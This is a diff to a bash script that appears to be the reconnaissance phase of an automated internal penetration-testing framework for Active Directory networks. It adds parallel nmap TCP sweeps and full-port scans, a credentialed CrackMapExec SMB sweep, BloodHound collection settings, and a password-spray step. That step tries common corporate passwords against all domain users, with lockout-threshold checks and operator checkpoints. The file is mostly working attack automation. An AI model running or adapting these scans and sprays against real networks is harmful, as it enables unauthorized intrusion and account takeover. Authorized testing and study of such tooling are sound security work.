@@ -13,6 +13,7 @@ source "${SCRIPT_DIR}/../lib/common.sh"
 
 log PHASE "Phase 1 — Reconnaissance & Discovery"
 check_testing_window
+detect_system_resources
 
 # ─── RUNTIME REQUIREMENTS ────────────────────────────────────────────────────
 require_var "DOMAIN_NAME"; require_var "DC_IP"; require_var "TARGET_SUBNETS"
@@ -23,84 +24,188 @@ OUT_NET="$(phase_dir phase1 network)"
 OUT_AD="$(phase_dir phase1 ad)"
 OUT_CLOUD="$(phase_dir phase1 cloud)"
 
-# ─── STEP 1.1 — HOST SWEEP (parallel, one per subnet) ───────────────────────
-log INFO "Starting host sweep across all subnets (parallel)..."
+# ─── BUILD NMAP EXCLUSION ARG ─────────────────────────────────────────────────
+# Converts SCAN_EXCLUDE_RANGES (space-separated) to nmap's comma-separated --exclude.
+# Empty string → no exclusion flag (nmap errors on --exclude with empty value).
+NMAP_EXCL_ARG=""
+if [[ -n "${SCAN_EXCLUDE_RANGES:-}" ]]; then
+    NMAP_EXCL_ARG="--exclude $(echo "${SCAN_EXCLUDE_RANGES}" | tr ' ' ',')"
+    log INFO "Exclusion list: ${SCAN_EXCLUDE_RANGES}"
+fi
+
+# ─── HELPER: extract IPs from gnmap (works for both -sn and -sS --open output) ──
+_gnmap_live_ips() {
+    local gnmap="$1"
+    # "Ports:" lines appear for hosts with at least one open port in -sS --open output.
+    # "Status: Up" lines appear in -sn output.  Handle both so skip-branch works
+    # against previously collected gnmap files regardless of which mode produced them.
+    grep -E 'Ports:.*\/open\/|Status: Up' "${gnmap}" 2>/dev/null \
+        | awk '{print $2}' | sort -u
+}
+
+# ─── STEP 1.1 — HOST SWEEP (TCP SYN — no ICMP, no ARP false positives) ───────
+# WHY TCP instead of -sn (ping sweep):
+#   -sn uses ICMP echo + ICMP timestamp + TCP SYN/ACK to ports 80 and 443.
+#   Every router, switch, printer, UPS, and IPMI card on the network responds
+#   to ICMP → massive false positives.  TCP SYN to SMB/RDP/WinRM ports only
+#   respond on real Windows workstations and servers, eliminating infrastructure
+#   noise at the sweep stage rather than having to filter it later.
+log INFO "Starting TCP host sweep across all subnets (parallel, no ICMP)..."
+log INFO "Discovery ports: ${NMAP_DISCOVERY_PORTS:-22,80,135,139,443,445,3389,5985,8080,8443}"
 LIVE_HOSTS_MERGED="${OUT_NET}/live_hosts_all.txt"
-> "${LIVE_HOSTS_MERGED}"  # clear/create
+> "${LIVE_HOSTS_MERGED}"
 
 if _step_is_skipped "host_sweep"; then
-    # Still need live hosts list for downstream steps — re-merge from any existing sweeps
     for subnet in ${TARGET_SUBNETS}; do
         safe_name="${subnet//\//_}"
         gnmap="${OUT_NET}/hostsweep_${safe_name}.gnmap"
-        { [[ -f "${gnmap}" ]] && grep 'Up' "${gnmap}" | awk '{print $2}' >> "${LIVE_HOSTS_MERGED}"; } || true
+        [[ -f "${gnmap}" ]] && _gnmap_live_ips "${gnmap}" >> "${LIVE_HOSTS_MERGED}" || true
     done
     sort -u "${LIVE_HOSTS_MERGED}" -o "${LIVE_HOSTS_MERGED}" 2>/dev/null || true
     LIVE_COUNT=$(wc -l < "${LIVE_HOSTS_MERGED}" 2>/dev/null || echo 0)
-    log INFO "host_sweep skipped — using existing live hosts file (${LIVE_COUNT} hosts)"
+    log INFO "host_sweep skipped — using cached live hosts (${LIVE_COUNT} hosts)"
 else
 
 for subnet in ${TARGET_SUBNETS}; do
     safe_name="${subnet//\//_}"
     sweep_out="${OUT_NET}/hostsweep_${safe_name}"
     if skip_if_exists "${sweep_out}.gnmap" "Host sweep ${subnet}" "host_sweep"; then
-        grep 'Up' "${sweep_out}.gnmap" 2>/dev/null | awk '{print $2}' >> "${LIVE_HOSTS_MERGED}" || true
+        _gnmap_live_ips "${sweep_out}.gnmap" >> "${LIVE_HOSTS_MERGED}" || true
         continue
     fi
-    log INFO "Sweeping subnet: ${subnet}"
+    log INFO "TCP sweep: ${subnet}"
     bg_run "hostsweep_${safe_name}" \
         "${OUT_NET}/hostsweep_${safe_name}.log" \
-        "${NMAP_BIN:-nmap}" -sn "${subnet}" \
+        "${NMAP_BIN:-nmap}" \
+            -sS --open \
+            -p "${NMAP_DISCOVERY_PORTS:-22,80,135,139,443,445,3389,5985,8080,8443}" \
+            -T"${NMAP_TIMING:-3}" \
+            --max-rate "${NMAP_MAX_RATE:-500}" \
+            --min-parallelism "${NMAP_MIN_PARALLEL:-40}" \
+            --max-parallelism "${NMAP_MAX_PARALLEL:-200}" \
+            --max-retries 1 \
+            --host-timeout 10s \
+            ${NMAP_EXCL_ARG} \
             -oA "${sweep_out}" \
-            --min-hostgroup "${NMAP_MIN_HOSTGROUP:-32}"
+            "${subnet}"
 done
 
-# Wait for all sweeps before merging
-wait_for_bg_jobs "host sweeps"
+wait_for_bg_jobs "TCP host sweeps"
 
-# Merge all live hosts
 for subnet in ${TARGET_SUBNETS}; do
     safe_name="${subnet//\//_}"
     gnmap="${OUT_NET}/hostsweep_${safe_name}.gnmap"
-    # || true: grep exits 1 when no 'Up' lines exist (empty subnet / ICMP blocked).
-    # Without this, set -euo pipefail kills the script before we reach the explicit
-    # "no live hosts" error message on the line below.
-    [[ -f "${gnmap}" ]] && grep 'Up' "${gnmap}" | awk '{print $2}' >> "${LIVE_HOSTS_MERGED}" || true
+    [[ -f "${gnmap}" ]] && _gnmap_live_ips "${gnmap}" >> "${LIVE_HOSTS_MERGED}" || true
 done
 sort -u "${LIVE_HOSTS_MERGED}" -o "${LIVE_HOSTS_MERGED}" 2>/dev/null || true
 LIVE_COUNT=$(wc -l < "${LIVE_HOSTS_MERGED}" 2>/dev/null || echo 0)
-log OK "Host sweep complete. Live hosts found: ${LIVE_COUNT} → ${LIVE_HOSTS_MERGED}"
+log OK "TCP host sweep complete — validated live hosts: ${LIVE_COUNT} → ${LIVE_HOSTS_MERGED}"
 
 fi  # end host_sweep skip gate
 
-# Only abort on zero live hosts if the full port scan is going to run — it is
-# the only step that requires -iL "${LIVE_HOSTS_MERGED}". Steps like smb_sweep,
-# ldap*, bloodhound, roadrecon and azure all target subnets or DC_IP directly.
 if [[ "${LIVE_COUNT:-0}" -eq 0 ]]; then
     if ! _step_is_skipped "nmap_fullscan"; then
-        log ERROR "No live hosts found — full port scan needs a live hosts list. Check TARGET_SUBNETS and ATTACKER_INTERFACE."
+        log ERROR "No live hosts found. Verify TARGET_SUBNETS and that NMAP_DISCOVERY_PORTS matches your environment."
         exit 1
     else
-        log WARN "No live hosts in cache yet — steps that require a live hosts list will be skipped automatically."
+        log WARN "No cached live hosts — downstream steps requiring the host list will skip automatically."
     fi
 fi
 
-# ─── STEP 1.2 — FULL PORT SCAN (background — runs overnight) ────────────────
+# ─── STEP 1.2 — FULL PORT SCAN (parallel across all vCPUs) ───────────────────
+# Splits the live hosts list into SYS_VCPUS chunks and runs one nmap per chunk
+# in parallel. On a 4-vCPU box this gives a ~4× wall-clock speedup over a
+# single sequential scan. Results are merged into fullscan.gnmap / fullscan.nmap
+# by a watcher job that fires automatically when all chunks finish.
 FULLSCAN_OUT="${OUT_NET}/fullscan"
-if ! skip_if_exists "${FULLSCAN_OUT}.xml" "Full port scan" "nmap_fullscan"; then
-    if checkpoint "Start full port scan (-p- against ${LIVE_COUNT} hosts). This runs in background and may take 3–5 hours."; then
-        log INFO "Launching full port scan as background job (overnight-friendly)..."
-        bg_run "nmap_fullscan" \
-            "${OUT_NET}/fullscan.log" \
-            "${NMAP_BIN:-nmap}" \
-                -sS -sV -sC -p- --open \
-                -T"${NMAP_TIMING:-4}" \
-                --min-hostgroup "${NMAP_MIN_HOSTGROUP:-32}" \
-                -iL "${LIVE_HOSTS_MERGED}" \
-                -oA "${FULLSCAN_OUT}"
-        log INFO "Full port scan running in background (PID: ${BG_JOB_PIDS[-1]}). Continuing with other tasks."
+CHUNK_DIR="${OUT_NET}/scan_chunks"
+
+# Attempt merge from existing chunks first (idempotent resume after partial run)
+if [[ -d "${CHUNK_DIR}" ]] && ls "${CHUNK_DIR}"/fullscan_chunk_*.gnmap &>/dev/null; then
+    TOTAL_CHUNKS=$(ls -1 "${CHUNK_DIR}"/chunk_* 2>/dev/null | wc -l)
+    DONE_CHUNKS=$(ls -1 "${CHUNK_DIR}"/fullscan_chunk_*.xml 2>/dev/null | wc -l)
+    if [[ "${DONE_CHUNKS}" -ge "${TOTAL_CHUNKS}" && "${TOTAL_CHUNKS}" -gt 0 ]]; then
+        cat "${CHUNK_DIR}"/fullscan_chunk_*.gnmap | sort -u > "${FULLSCAN_OUT}.gnmap" 2>/dev/null || true
+        cat "${CHUNK_DIR}"/fullscan_chunk_*.nmap          > "${FULLSCAN_OUT}.nmap"  2>/dev/null || true
+        log OK "Merged ${DONE_CHUNKS}/${TOTAL_CHUNKS} existing scan chunks into ${FULLSCAN_OUT}.gnmap"
+    fi
+fi
+
+if ! skip_if_exists "${FULLSCAN_OUT}.gnmap" "Full port scan" "nmap_fullscan"; then
+    if checkpoint "Start full TCP port scan (-p-) against ${LIVE_COUNT} validated hosts? (${SYS_VCPUS} parallel jobs on ${SYS_VCPUS}-vCPU system)"; then
+
+        mkdir -p "${CHUNK_DIR}"
+        SCAN_RATE=$(( ${NMAP_MAX_RATE:-500} * 2 ))  # aggressive on confirmed live hosts
+
+        if [[ "${LIVE_COUNT}" -gt 50 && "${SYS_VCPUS:-1}" -gt 1 ]]; then
+            # ── Parallel path: one nmap per vCPU ────────────────────────────
+            N_JOBS="${SYS_VCPUS}"
+            LINES_PER_CHUNK=$(( LIVE_COUNT / N_JOBS + 1 ))
+            split -l "${LINES_PER_CHUNK}" "${LIVE_HOSTS_MERGED}" "${CHUNK_DIR}/chunk_"
+            CHUNK_LIST=( "${CHUNK_DIR}"/chunk_* )
+            log INFO "Splitting ${LIVE_COUNT} hosts into ${#CHUNK_LIST[@]} chunks (${LINES_PER_CHUNK} hosts/chunk)..."
+
+            for chunk in "${CHUNK_LIST[@]}"; do
+                suffix=$(basename "${chunk}")
+                bg_run "nmap_fullscan_${suffix}" \
+                    "${CHUNK_DIR}/fullscan_${suffix}.log" \
+                    "${NMAP_BIN:-nmap}" \
+                        -sS -sV -sC -p- --open \
+                        -T"${NMAP_TIMING:-3}" \
+                        --min-parallelism "${NMAP_MIN_PARALLEL:-40}" \
+                        --max-parallelism "${NMAP_MAX_PARALLEL:-200}" \
+                        --max-rate "${SCAN_RATE}" \
+                        --max-retries 2 \
+                        --host-timeout 30s \
+                        ${NMAP_EXCL_ARG} \
+                        -iL "${chunk}" \
+                        -oA "${CHUNK_DIR}/fullscan_${suffix}"
+            done
+
+            log INFO "${#CHUNK_LIST[@]} parallel nmap jobs started."
+
+            # ── Launch a merge-watcher that polls until all chunks complete ──
+            MERGE_SCRIPT=$(mktemp /tmp/nmap_merge_XXXXXX.sh)
+            chmod +x "${MERGE_SCRIPT}"
+            cat > "${MERGE_SCRIPT}" <<MERGE_EOF
+#!/usr/bin/env bash
+CHUNK_DIR="${CHUNK_DIR}"
+FULLSCAN_OUT="${FULLSCAN_OUT}"
+N_CHUNKS=${#CHUNK_LIST[@]}
+echo "\$(date '+%H:%M:%S') Merge watcher started — waiting for \${N_CHUNKS} chunk(s)"
+while true; do
+    done_count=\$(ls -1 "\${CHUNK_DIR}"/fullscan_chunk_*.xml 2>/dev/null | wc -l)
+    echo "\$(date '+%H:%M:%S') \${done_count}/\${N_CHUNKS} chunks complete"
+    [[ \${done_count} -ge \${N_CHUNKS} ]] && break
+    sleep 30
+done
+echo "All chunks done — merging..."
+cat "\${CHUNK_DIR}"/fullscan_chunk_*.gnmap 2>/dev/null | sort -u > "\${FULLSCAN_OUT}.gnmap"
+cat "\${CHUNK_DIR}"/fullscan_chunk_*.nmap  2>/dev/null > "\${FULLSCAN_OUT}.nmap"
+echo "MERGE COMPLETE: \$(wc -l < "\${FULLSCAN_OUT}.gnmap") lines → \${FULLSCAN_OUT}.gnmap"
+rm -f "\$0"
+MERGE_EOF
+            bg_run "nmap_fullscan_merge" "${OUT_NET}/nmap_merge.log" bash "${MERGE_SCRIPT}"
+            log INFO "Merge watcher active — results auto-consolidate to ${FULLSCAN_OUT}.gnmap when all chunks finish."
+        else
+            # ── Single job for small host lists ────────────────────────────
+            log INFO "Starting single full-port scan (${LIVE_COUNT} hosts)..."
+            bg_run "nmap_fullscan" \
+                "${OUT_NET}/fullscan.log" \
+                "${NMAP_BIN:-nmap}" \
+                    -sS -sV -sC -p- --open \
+                    -T"${NMAP_TIMING:-3}" \
+                    --min-parallelism "${NMAP_MIN_PARALLEL:-40}" \
+                    --max-parallelism "${NMAP_MAX_PARALLEL:-200}" \
+                    --max-rate "${SCAN_RATE}" \
+                    --max-retries 2 \
+                    --host-timeout 30s \
+                    ${NMAP_EXCL_ARG} \
+                    -iL "${LIVE_HOSTS_MERGED}" \
+                    -oA "${FULLSCAN_OUT}"
+        fi
     else
-        log INFO "Full port scan skipped — run manually when ready: nmap -sS -sV -sC -p- --open -iL ${LIVE_HOSTS_MERGED} -oA ${FULLSCAN_OUT}"
+        log INFO "Full port scan skipped — re-run: python3 orchestrator.py --phase 1 --only nmap_fullscan"
     fi
 fi
 
@@ -108,13 +213,16 @@ fi
 SMB_OUT="${OUT_AD}/smb_sweep.txt"
 if ! skip_if_exists "${SMB_OUT}" "CrackMapExec SMB sweep" "smb_sweep"; then
     log INFO "Starting CrackMapExec SMB sweep (signing + host enumeration)..."
+    # Use single-quoted bash -c body so DOMAIN_PASS (and other vars) are resolved
+    # from the inherited environment at execution time, not expanded here.  Inline
+    # double-quoted expansion would break if the password contains ' or \.
     bg_run "cmexec_smb_sweep" \
         "${OUT_AD}/smb_sweep.log" \
-        bash -c "for subnet in ${TARGET_SUBNETS}; do \
-            ${CME_BIN} smb \"\${subnet}\" \
-                -u '${DOMAIN_USER}' -p '${DOMAIN_PASS}' -d '${DOMAIN_NAME}' \
-                2>&1; \
-        done > '${SMB_OUT}'"
+        bash -c 'for subnet in $TARGET_SUBNETS; do
+            $CME_BIN smb "$subnet" \
+                -u "$DOMAIN_USER" -p "$DOMAIN_PASS" -d "$DOMAIN_NAME" \
+                2>&1
+        done > "$OUTPUT_BASE_DIR/phase1/ad/smb_sweep.txt"'
     log INFO "CME SMB sweep running in background."
 fi
 
@@ -181,6 +289,7 @@ else
             -ns "${DC_IP}" \
             -c All \
             --zip \
+            -w "${BH_WORKERS:-20}" \
             -o "${BH_OUT_DIR}"
     log INFO "BloodHound collection running in background."
 fi
@@ -264,16 +373,85 @@ if [[ -f "${SMB_OUT}" ]]; then
     fi
 fi
 
+# ─── STEP 1.10 — CONTROLLED PASSWORD SPRAY (optional) ───────────────────────
+# Only runs when SPRAY_ENABLED=true in config.env.
+# SPRAY_MAX_ATTEMPTS MUST be below the domain lockout threshold (verify via Phase 2
+# password policy check first; default guard is 2 attempts, well below typical 5).
+if [[ "${SPRAY_ENABLED:-false}" != "true" ]]; then
+    log INFO "Password spray disabled (SPRAY_ENABLED=false). Set SPRAY_ENABLED=true in config.env to enable."
+else
+    SPRAY_OUT="${OUT_AD}/spray_results.txt"
+    if skip_if_exists "${SPRAY_OUT}" "Password spray results" "host_sweep"; then
+        :
+    else
+        require_file "${OUT_AD}/userlist.txt"
+
+        MAX_ATTEMPTS="${SPRAY_MAX_ATTEMPTS:-2}"
+        DELAY_SECS="${SPRAY_DELAY_SECONDS:-1800}"
+
+        # Safety: refuse to spray if lockout threshold is unknown
+        POLFILE="${OUTPUT_BASE_DIR}/phase2/ad/ad_checks/password_policy.txt"
+        if [[ -f "${POLFILE}" ]]; then
+            LOCKOUT_THRESH=$(grep -i 'Account lockout threshold' "${POLFILE}" | grep -oE '[0-9]+' | head -1 || echo 0)
+            if [[ "${LOCKOUT_THRESH:-0}" -gt 0 && "${MAX_ATTEMPTS}" -ge "${LOCKOUT_THRESH}" ]]; then
+                log ERROR "SPRAY BLOCKED: SPRAY_MAX_ATTEMPTS (${MAX_ATTEMPTS}) >= lockout threshold (${LOCKOUT_THRESH}). Reduce SPRAY_MAX_ATTEMPTS in config.env."
+                log ERROR "This would lock out accounts. Aborting spray."
+            else
+                log WARN "SPRAY: lockout threshold=${LOCKOUT_THRESH}, max_attempts=${MAX_ATTEMPTS} — safe margin confirmed."
+                _do_spray=true
+            fi
+        else
+            log WARN "Password policy not yet collected (run Phase 2 first, or accept risk). Proceeding with SPRAY_MAX_ATTEMPTS=${MAX_ATTEMPTS}."
+            _do_spray=true
+        fi
+
+        if [[ "${_do_spray:-false}" == "true" ]]; then
+            # Commonly used corporate patterns to try
+            SPRAY_PASSWORDS=("${DOMAIN_NAME%%.*}2024!" "${DOMAIN_NAME%%.*}2025!" "Welcome1!" "Password1!" "Summer2024!" "Summer2025!")
+
+            attempt=0
+            for pwd in "${SPRAY_PASSWORDS[@]}"; do
+                [[ ${attempt} -ge ${MAX_ATTEMPTS} ]] && break
+                if ! checkpoint "Spray attempt $((attempt+1))/${MAX_ATTEMPTS}: try password '${pwd}' against all domain users (${DELAY_SECS}s delay between attempts)"; then
+                    log INFO "Spray attempt skipped by operator."
+                    continue
+                fi
+                log INFO "Spray attempt $((attempt+1)): password = [REDACTED FROM LOG]"
+                log_cmd "${CME_BIN} smb ${DC_IP} -u ${OUT_AD}/userlist.txt -p *** -d ${DOMAIN_NAME} --continue-on-success"
+                "${CME_BIN}" smb "${DC_IP}" \
+                    -u "${OUT_AD}/userlist.txt" \
+                    -p "${pwd}" \
+                    -d "${DOMAIN_NAME}" \
+                    --continue-on-success \
+                    2>&1 >> "${SPRAY_OUT}" || true
+
+                HITS=$(grep -c '(Pwn3d)\|[+] ' "${SPRAY_OUT}" 2>/dev/null || echo 0)
+                log OK "Spray attempt $((attempt+1)) complete. Hits so far: ${HITS}"
+                (( attempt++ ))
+
+                if [[ ${attempt} -lt ${MAX_ATTEMPTS} && ${#SPRAY_PASSWORDS[@]} -gt ${attempt} ]]; then
+                    log INFO "Waiting ${DELAY_SECS}s before next spray attempt (anti-lockout delay)..."
+                    sleep "${DELAY_SECS}"
+                fi
+            done
+            SPRAY_HITS=$(grep -c '(Pwn3d)\|[+] ' "${SPRAY_OUT}" 2>/dev/null || echo 0)
+            [[ "${SPRAY_HITS}" -gt 0 ]] && \
+                log WARN "FINDING: ${SPRAY_HITS} account(s) found via password spray → ${SPRAY_OUT}" || \
+                log OK "Password spray: no hits with tested passwords"
+        fi
+    fi
+fi
+
 # ─── STATUS SUMMARY ──────────────────────────────────────────────────────────
 echo ""
 status_bg_jobs
 echo ""
 echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════════${RESET}"
 echo -e "${BOLD}${CYAN}  Phase 1 — Active Steps Complete${RESET}"
-echo -e "${BOLD}${CYAN}  Background Jobs: Still running (check with --status)${RESET}"
+echo -e "${BOLD}${CYAN}  Background jobs running — track with: python3 orchestrator.py --status${RESET}"
 echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════════${RESET}"
 echo -e "${YELLOW}  Background jobs to monitor:${RESET}"
-echo -e "    • Nmap full port scan    → ${FULLSCAN_OUT}.xml (check tomorrow AM)"
+echo -e "    • Nmap full port scan    → ${FULLSCAN_OUT}.gnmap (merged automatically when done)"
 echo -e "    • BloodHound collection  → ${BH_OUT_DIR}/*.zip"
 echo -e "    • ROADrecon gather       → ${ROAD_DB}"
 echo -e "    • Azure inventory        → ${AZURE_INV}"
